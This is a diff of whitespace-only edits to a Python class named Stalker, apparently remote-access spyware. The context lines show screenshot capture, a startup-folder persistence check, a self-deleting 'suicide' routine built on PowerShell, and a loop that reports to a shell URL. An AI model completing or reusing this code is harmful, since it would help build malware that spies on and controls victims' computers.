@@ -11,6 +11,7 @@ from PIL import ImageGrab
 
 
 
+
 class Stalker:
     def __init__(self):
         self.running = True
@@ -57,7 +58,7 @@ class Stalker:
 
     def is_file_in_startup(self):
         return sys.argv[0].startswith(self.StartupFolder)
-
+    
 
     def suicide(self):
         ps_command = f"""
@@ -69,7 +70,7 @@ class Stalker:
 
         self.SendText("<shell>bye my friend :)", self.Shell_url)
         self.running = False
-    
+
 
     def Shell(self):
         while self.running:
